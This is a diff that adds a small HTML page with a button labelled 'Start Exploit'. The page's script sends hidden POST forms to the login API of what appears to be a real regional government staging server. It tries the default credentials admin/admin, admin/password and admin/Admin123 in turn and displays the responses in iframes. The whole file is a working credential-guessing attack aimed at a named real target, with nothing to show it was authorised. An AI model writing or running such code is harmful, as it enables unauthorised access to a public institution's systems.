@@ -1,0 +1,69 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>azza123</title>
+  </head>
+  <body>
+    <h1>azzatest</h1>
+    <button onclick="go()">CLick Here to Start Exploit</button>
+    <div id="results"></div>
+
+    <script>
+      function go() {
+        const target = "https://staging.sukoharjokab.go.id/api/auth/login";
+
+        const creds = [
+          ["admin", "admin"],
+          ["admin", "password"],
+          ["admin", "Admin123"],
+        ];
+
+        creds.forEach(([u, p], i) => {
+          setTimeout(() => {
+            console.log(`[${i + 1}] Testing: ${u}:${p}`);
+
+            // Create hidden iframe
+            const iframe = document.createElement("iframe");
+            iframe.id = `result_${i}`;
+            iframe.name = `result_${i}`;
+            iframe.style.width = "100%";
+            iframe.style.height = "200px";
+            iframe.style.border = "1px solid #ccc";
+            iframe.style.margin = "10px 0";
+            document.getElementById("results").appendChild(iframe);
+
+            // Create form
+            const form = document.createElement("form");
+            form.method = "POST";
+            form.action = target;
+            form.target = iframe.name;
+
+            // Add username
+            const inp1 = document.createElement("input");
+            inp1.name = "username";
+            inp1.value = u;
+            form.appendChild(inp1);
+
+            // Add password
+            const inp2 = document.createElement("input");
+            inp2.name = "password";
+            inp2.value = p;
+            form.appendChild(inp2);
+
+            // Submit
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+
+            // Add label
+            const label = document.createElement("div");
+            label.textContent = `Test ${i + 1}: ${u}:${p}`;
+            label.style.fontWeight = "bold";
+            document.getElementById("results").insertBefore(label, iframe);
+          }, i * 2000);
+        });
+      }
+    </script>
+  </body>
+</html>
